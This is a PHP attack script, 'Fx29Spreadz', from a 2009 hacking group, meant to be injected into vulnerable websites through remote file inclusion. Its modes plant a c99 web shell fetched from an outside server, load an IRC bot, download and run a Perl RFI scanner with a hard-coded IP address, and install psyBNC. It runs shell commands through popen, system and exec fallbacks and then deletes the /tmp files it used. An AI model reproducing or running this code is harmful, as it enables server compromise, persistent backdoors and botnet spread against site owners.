<?php
##########################################
## Fx29Spreadz v1.0 By FaTaLisTiCz_Fx	##
## � 2008 - Apr 2009 FeeLCoMz Community ##	
## http://feelcomz.co.cc              	##
##########################################
## Usage:
## + http://target/bug.php?bug=http://YOURSITE/spreadz.txt?&modez=[MODEZ]
##
## Modez:
## + botz -> Run PHP Bot
## + shellz -> Upload PHP Shell
## + scannerz -> Run RFI Scanner
## + psybnc -> Run psyBNC
## + You could add your own toolz :-)
?>
<html>
<style>
  body { font:10pt tahoma;color:#808080;background:black;margin:4; }
  a    { color:#3366FF;text-decoration:none; }
</style>
<body>
<?php
$modez = $_GET["modez"];

##[ CONF ]##
$situz   = 'http://www.petrrichter.cz/style/'; #Your site URL
$sh_src  = $situz.'c99.txt'; #Fx29Shell Source
$sh_file = 'index2.php'; #Target Filename

##[ FX29PHPBOT CONF ]##
$b_src   = $situz.'main.css'; #Fx29PHPBot with network parameters

##[ FEELCOMZ RFI SCANNER CONF ]##
$s_src   = $situz.'ac.txt'; #FeeLCoMz RFI Scanner Source
$s_dir   = '/tmp/'; #Temp dir
$s_file  = 'ac.txt'; #RFI Scanner filename
$s_fmask = 'ac*'; #Filename mask to delete
$s_arg   = 'xoxo 114.202.247.166 9090'; #RFI Scanner Parameters

##[ PSYBNC CONF ]##
$p_src   = $situz.'fx.tgz'; #psyBNC URL
$p_dir   = '/tmp/'; #Temp dir for psyBNC
$p_file  = 'fx.tgz'; #
$p_fmask = 'fx.tgz*';
$p_port  = '29110'; #Port to run psyBNC

##[ MODEZ ]##
switch ($modez) {
  case "botz":
    include($b_src);
    break;
  case "shellz":
    $cdir = @getcwd();
    $html = implode('', @file($sh_src));
    $f    = ($cdir.DIRECTORY_SEPARATOR.$sh_file);
    $r    = @fopen($f,'w');
    if (@fwrite($r,$html)) { echo "Writed to $f!"; }
    else { die("Error writing $f!"); }
    fclose($r);
    break;
  case "scannerz":
    echo fx29exec('cd '.$s_dir.';rm -rf '.$s_fmask);
    echo fx29exec('cd '.$s_dir.';wget '.$s_src);
    echo fx29exec('cd '.$s_dir.';curl -O '.$s_src);
    echo fx29exec('cd '.$s_dir.';perl '.$s_file.' '.$s_arg);
    echo fx29exec('cd '.$s_dir.';rm -rf '.$s_fmask);
    break;
  case "psybnc":
    echo fx29exec('cd '.$p_dir.';wget '.$p_src);
    echo fx29exec('cd '.$p_dir.';curl -O '.$p_src);
    echo fx29exec('cd '.$p_dir.';tar -zxf '.$p_file);
    echo fx29exec('cd '.$p_dir.'/.fx/;./config '.$p_port.';./fuck;./run');
    echo fx29exec('cd '.$p_dir.';rm -rf '.$p_fmask);
    break;
  default:
    echo "Unknown Modez!";
    break;
}

###########################
##[ FX29SHELL W/ STDERR ]##
###########################
function safemode() { return (@ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode")) ) ? TRUE : FALSE; }
function getdisfunc() { $rez = explode(",",@ini_get("disable_functions")); return (!empty($rez))?$rez:array(); }
function enabled($func) { return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }
function fx29exec($cmd) {
  $rez = "";
  if (enabled("popen")) { if ( is_resource($h = popen($cmd.' 2>&1', 'r')) ) { while ( !feof($h) ) { @$rez .= fread($h, 2096);  } pclose($h); } }
  elseif (enabled("passthru")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
  elseif (enabled("system")) { @ob_start(); system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
  elseif (enabled("exec")) { exec($cmd,$o); $rez = join("\r\n",$o); }
  elseif (enabled("shell_exec")) { $rez = shell_exec($cmd); }
  return $rez;
}
function tulis_file($nf,$txt) {
  if (!$handle = fopen($nf, 'a')) { echo "Error opening $namafile!"; return; }
  if (fwrite($handle, $txt) === FALSE) { echo "Error writing $nf!"; return; }
  else { echo "Saved! $txt"; fclose($handle); }
}
?>

</body></html>
<?php die(); ?>
